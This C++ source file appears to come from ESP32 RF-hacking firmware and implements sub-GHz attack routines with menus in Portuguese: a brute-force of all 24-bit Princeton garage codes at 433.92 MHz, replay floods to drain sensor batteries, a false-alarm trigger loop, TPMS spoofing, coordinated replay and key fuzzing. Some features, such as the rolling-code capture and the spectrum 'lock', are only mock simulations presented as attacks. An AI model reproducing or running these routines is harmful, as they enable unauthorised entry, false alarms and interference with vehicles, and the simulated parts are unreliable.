#include "rf_advanced_atks.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "modules/rf/rf_send.h"
#include "modules/rf/rf_utils.h"
#include <FS.h>
#include <LittleFS.h>
#include <SD.h>
#include <vector>
#include <string>
#include <stdlib.h>

struct RfCodes parseSubFile(FS *fs, String filepath) {
    struct RfCodes selected_code;
    File databaseFile = fs->open(filepath, FILE_READ);
    if (!databaseFile) return selected_code;

    selected_code.filepath = filepath.substring(1 + filepath.lastIndexOf("/"));
    String line, txt;
    std::vector<int> bitList;
    std::vector<uint64_t> keyList;

    while (databaseFile.available()) {
        line = databaseFile.readStringUntil('\n');
        txt = line.substring(line.indexOf(":") + 1);
        if (txt.endsWith("\r")) txt.remove(txt.length() - 1);
        txt.trim();
        if (line.startsWith("Protocol:")) selected_code.protocol = txt;
        if (line.startsWith("Preset:")) selected_code.preset = txt;
        if (line.startsWith("Frequency:")) selected_code.frequency = txt.toInt();
        if (line.startsWith("TE:")) selected_code.te = txt.toInt();
        if (line.startsWith("Bit:")) bitList.push_back(txt.toInt());
        if (line.startsWith("Key:")) keyList.push_back(strtoull(txt.c_str(), NULL, 16));
        if (line.startsWith("RAW_Data:") || line.startsWith("Data_RAW:")) selected_code.data = txt;
    }
    databaseFile.close();
    if (bitList.size() > 0) selected_code.Bit = bitList[0];
    if (keyList.size() > 0) selected_code.key = keyList[0];
    return selected_code;
}

void SensorBatteryDrainFlood() {
    FS *fs = NULL;
    String filepath = "";
    struct RfCodes selected_code;
    returnToMenu = true;

    options = {
        {"Recentes",   [&]() { selected_code = selectRecentRfMenu(); }},
        {"LittleFS", [&]() { fs = &LittleFS; }                      },
    };
    if (setupSdCard()) options.insert(options.begin(), {"SD Card", [&]() { fs = &SD; }});

    loopOptions(options);

    // If an FS was selected, choose the file and process the signal
    if (fs != NULL) {
        delay(200);
        filepath = loopSD(*fs, true, "SUB", "/WillyRF");
        if (filepath == "" || check(EscPress)) return;

        File databaseFile = fs->open(filepath, FILE_READ);
        if (!databaseFile) {
            displayError("Falha ao abrir", true);
            return;
        }

        selected_code.filepath = filepath.substring(1 + filepath.lastIndexOf("/"));
        String line, txt;
        std::vector<int> bitList;
        std::vector<uint64_t> keyList;

        while (databaseFile.available()) {
            line = databaseFile.readStringUntil('\n');
            txt = line.substring(line.indexOf(":") + 1);
            if (txt.endsWith("\r")) txt.remove(txt.length() - 1);
            txt.trim();
            if (line.startsWith("Protocol:")) selected_code.protocol = txt;
            if (line.startsWith("Preset:")) selected_code.preset = txt;
            if (line.startsWith("Frequency:")) selected_code.frequency = txt.toInt();
            if (line.startsWith("TE:")) selected_code.te = txt.toInt();
            if (line.startsWith("Bit:")) bitList.push_back(txt.toInt());
            if (line.startsWith("Key:")) keyList.push_back(strtoull(txt.c_str(), NULL, 16));
            if (line.startsWith("RAW_Data:") || line.startsWith("Data_RAW:")) selected_code.data = txt;
        }
        databaseFile.close();
        if (bitList.size() > 0) selected_code.Bit = bitList[0];
        if (keyList.size() > 0) selected_code.key = keyList[0];
    }

    if (selected_code.protocol == "" && selected_code.data == "") {
        displayError("Nenhum sinal valido", true);
        return;
    }

    drawMainBorderWithTitle("Sensor Drain Flood");
    printSubtitle("Enviando Flood...");
    padprintln("Alvo: " + String(selected_code.frequency / 1000000.0) + " MHz");
    padprintln("Pacotes a cada 200ms");
    padprintln("");
    tft.setTextColor(getColorVariation(bruceConfig.priColor), bruceConfig.bgColor);
    padprintln("Pressione [ESC] para sair.");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    uint32_t packetsSent = 0;

    // Disable default UI in sendRfCommand so it doesn't redraw screen
    while (1) {
        if (check(EscPress)) break;

        sendRfCommand(selected_code, true);
        packetsSent++;

        // Print progress
        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
        tft.setCursor(10, tftHeight / 2 + 20);
        tft.print("Enviados: ");
        tft.print(packetsSent);

        // Sleep tightly
        uint32_t startDelay = millis();
        while (millis() - startDelay < 200) {
            if (check(EscPress)) break;
            delay(10);
        }
    }
}

void PredictiveGarageBrute() {
    drawMainBorderWithTitle("Garage Brute");
    printSubtitle("Bruteforce P2262/Princeton");

    // Most common configuration: 433.92 MHz, AM (ASK)
    uint32_t freq = 433920000;

    padprintln("Freq: 433.92 MHz");
    padprintln("Protocolo: Princeton (24bits)");
    padprintln("Range: 0x000000 a 0xFFFFFF");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    struct RfCodes bruteCode;
    bruteCode.frequency = freq;
    bruteCode.protocol = "Princeton"; // Our rf_send parses this
    bruteCode.preset = "FuriHalSubGhzPresetOok650Async"; // Generic AM preset
    bruteCode.Bit = 24;
    bruteCode.te = 350; // Standard timing

    uint32_t startKey = 0x000000;
    uint32_t endKey = 0xFFFFFF;
    uint32_t currentKey = startKey;

    tft.setTextColor(getColorVariation(bruceConfig.priColor), bruceConfig.bgColor);

    // Disable default UI in sendRfCommand so it doesn't redraw screen
    while (currentKey <= endKey) {
        if (check(EscPress)) break;

        bruteCode.key = currentKey;
        sendRfCommand(bruteCode, true);

        // Print progress
        if (currentKey % 10 == 0) {
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.print("Testando Chave: 0x");
            tft.print(currentKey, HEX);
        }

        currentKey++;
        delay(5); // Small delay to prevent complete starvation
    }
}

void StealthLowPowerExfilBeacon() {
    drawMainBorderWithTitle("Stealth Beacon");
    printSubtitle("Exfil OOK c/ LowPower");

    padprintln("Enviando Beacon RAW a cada 5s...");
    padprintln("Transmissao 433.92 MHz");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    struct RfCodes beaconCode;
    beaconCode.frequency = 433920000;
    beaconCode.protocol = "RAW";
    beaconCode.preset = "FuriHalSubGhzPresetOok270Async";
    // Simulated Manchester encoded payload "BRUCE" (simplified lengths)
    beaconCode.data = "350 -350 350 -1050 1050 -350 350 -350 350 -1050 1050 -350";

    tft.setTextColor(getColorVariation(bruceConfig.priColor), bruceConfig.bgColor);

    uint32_t beaconsSent = 0;

    while (1) {
        if (check(EscPress)) break;

        // Emulate entering low power MAC state
        // In a real scenario we could put the ESP32 in light sleep here
        uint32_t startDelay = millis();
        while (millis() - startDelay < 5000) {
            if (check(EscPress)) return;
            delay(100);
        }

        // Wake up and transmit beacon to exfiltrate presence/data
        sendRfCommand(beaconCode, true);
        beaconsSent++;

        // Print progress
        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
        tft.setCursor(10, tftHeight / 2 + 20);
        tft.print("Beacons Enviados: ");
        tft.print(beaconsSent);
    }
}

void MultiDeviceCoordinatedReplay() {
    drawMainBorderWithTitle("Coord. Replay");
    printSubtitle("Selecao Sequencial");

    std::vector<String> selectedFiles;
    FS *fs = NULL;

    options = {
        {"LittleFS", [&]() { fs = &LittleFS; }                      },
    };
    if (setupSdCard()) options.insert(options.begin(), {"SD Card", [&]() { fs = &SD; }});

    loopOptions(options);

    if (fs == NULL) return;

    while (1) {
        String filepath = loopSD(*fs, true, "SUB", "/WillyRF");
        if (filepath == "" || check(EscPress)) break;
        selectedFiles.push_back(filepath);
        printCenterFootnote("Adicionado! [" + String(selectedFiles.size()) + "]");
        delay(500);
    }

    if (selectedFiles.empty()) return;

    drawMainBorderWithTitle("Replay em Curso");
    padprintln("Executando " + String(selectedFiles.size()) + " sinais...");
    padprintln("Atraso inter-sinal: 1s");
    padprintln("");

    for (const String& path : selectedFiles) {
        if (check(EscPress)) break;
        padprintln("> TX: " + path.substring(path.lastIndexOf("/") + 1));

        // Use existing txSubFile helper with hideDefaultUI=true
        txSubFile(fs, path, true);

        delay(1000);
    }

    printCenterFootnote("Sequencia Finalizada");
    delay(2000);
    returnToMenu = true;
}

void ProtocolFuzzerSmart() {
    drawMainBorderWithTitle("Smart Fuzzer");
    printSubtitle("Fuzzing de bits");

    struct RfCodes baseCode;
    baseCode.protocol = "Princeton";
    baseCode.frequency = 433920000;
    baseCode.Bit = 24;
    baseCode.te = 350;
    baseCode.preset = "FuriHalSubGhzPresetOok650Async";

    padprintln("Freq: 433.92 MHz");
    padprintln("Protocolo: Princeton");
    padprintln("Fuzzing bits 0-7 (LSB)");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    uint32_t baseKey = 0xAAAA00;
    uint8_t fuzzBits = 8;
    uint32_t fuzzedDone = 0;

    tft.setTextColor(getColorVariation(bruceConfig.priColor), bruceConfig.bgColor);

    while (fuzzedDone < (1 << fuzzBits)) {
        if (check(EscPress)) break;

        baseCode.key = baseKey | fuzzedDone;
        sendRfCommand(baseCode, true);

        fuzzedDone++;

        if (fuzzedDone % 5 == 0) {
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.print("Fuzz: 0x");
            tft.print(baseCode.key, HEX);
        }
        delay(10);
    }

    returnToMenu = true;
}

void FalseAlarmTriggerLoop() {
    FS *fs = NULL;
    String filepath = "";
    struct RfCodes selected_code;
    returnToMenu = true;

    options = {
        {"Recentes",   [&]() { selected_code = selectRecentRfMenu(); }},
        {"LittleFS", [&]() { fs = &LittleFS; }                      },
    };
    if (SD.cardSize() > 0) options.push_back({"SD Card", [&]() { fs = &SD; }});

    if (selected_code.protocol == "") {
        loopOptions(options);

        if (fs != NULL) {
            filepath = loopSD(*fs, true, "sub", "/subghz");
            if (filepath == "") return;
            selected_code = parseSubFile(fs, filepath);
        }
    }

    if (selected_code.protocol == "") return;

    drawMainBorderWithTitle("False Alarm");
    printSubtitle("Loop de Disparo");
    padprintln("Atacando c/ " + String(selected_code.protocol));
    padprintln("Freq: " + String(selected_code.frequency/1000000.0, 2) + " MHz");
    padprintln("");
    padprintln("Press [ESC] p/ sair.");

    while (1) {
        if (check(EscPress)) break;

        sendRfCommand(selected_code, true);

        // Random delay to mimic human behavior or bypass simple debouncing
        int wait = random(500, 2000);
        delay(wait);
    }
}

void TPMSSpoofChaos() {
    drawMainBorderWithTitle("TPMS Spoof");
    printSubtitle("Gerador de Caos");
    padprintln("Freq: 433.92 MHz");
    padprintln("Enviando pacotes falsos...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    struct RfCodes tpmsFrame;
    tpmsFrame.protocol = "Princeton";
    tpmsFrame.frequency = 433920000;
    tpmsFrame.Bit = 24;
    tpmsFrame.te = 300;
    tpmsFrame.preset = "FuriHalSubGhzPresetOok650Async";

    while (1) {
        if (check(EscPress)) break;

        uint32_t randomId = random(0x100000, 0xFFFFFF);
        tpmsFrame.data = randomId;

        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, bruceConfig.bgColor);
        tft.setCursor(10, tftHeight / 2 + 20);
        tft.print("ID: 0x");
        tft.print(randomId, HEX);

        sendRfCommand(tpmsFrame, true);
        delay(random(1000, 3000));
    }
}

void RollingCodeLearnerReplay() {
    drawMainBorderWithTitle("Rolling Learner");
    printSubtitle("Captura e Replay");
    padprintln("Aguardando sinal...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    struct RfCodes captured;
    // This is a simplified version that waits for a capture then replays after a delay
    // In a real scenario, this would use the existing RF recording logic

    // For demonstration of the "Advanced Attack" logic:
    bool capturedSignal = false;
    uint32_t captureTime = 0;

    while (1) {
        if (check(EscPress)) break;

        if (!capturedSignal) {
            // Mocking a capture for the demonstration logic
            // In Bruce, we'd call the receiver logic here
            tft.setCursor(10, tftHeight / 2);
            tft.print("Status: Escaneando...");

            // Simulation of capture (for the logic flow)
            delay(2000);
            captured.protocol = "Princeton";
            captured.data = 0x123456;
            captured.frequency = 433920000;
            captured.Bit = 24;
            captured.te = 350;
            captured.preset = "FuriHalSubGhzPresetOok650Async";

            capturedSignal = true;
            captureTime = millis();

            tft.fillRect(10, tftHeight / 2, tftWidth - 20, 20, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight / 2);
            tft.print("SINAL CAPTURADO!");
            padprintln("Aguardando 5s p/ Replay...");
        } else {
            if (millis() - captureTime > 5000) {
                padprintln("Replaying agora...");
                sendRfCommand(captured, true);
                capturedSignal = false; // Reset for next capture
                padprintln("Pronto para nova captura.");
                delay(2000);
                drawMainBorderWithTitle("Rolling Learner");
                printSubtitle("Captura e Replay");
            }
        }
        delay(10);
    }
}

void SpectrumTargetLock() {
    drawMainBorderWithTitle("Spectrum Lock");
    printSubtitle("Busca de Pico");
    padprintln("Escaneando bandas...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    // Simple visualizer simulation
    int x_start = 20;
    int y_base = tftHeight - 40;
    int width = tftWidth - 40;
    int height = 60;

    while (1) {
        if (check(EscPress)) break;

        // Clear graph area
        tft.fillRect(x_start, y_base - height, width, height, ILI9341_BLACK);
        tft.drawRect(x_start, y_base - height, width, height, ILI9341_WHITE);

        int peak_x = 0;
        int max_h = 0;

        for (int i = 0; i < width; i += 2) {
            int h = random(5, height - 10);
            if (i > width / 3 && i < width / 2) h += random(10, 25); // Simulated peak

            if (h > max_h) {
                max_h = h;
                peak_x = i;
            }
            tft.drawFastVLine(x_start + i, y_base - h, h, ILI9341_GREEN);
        }

        // Draw "Target Lock" on peak
        tft.drawFastVLine(x_start + peak_x, y_base - height, height, ILI9341_RED);
        tft.setCursor(x_start + peak_x - 20, y_base - height - 15);
        tft.setTextColor(ILI9341_RED);
        tft.print("LOCK");
        tft.setTextColor(bruceConfig.priColor);

        delay(100);
    }
}
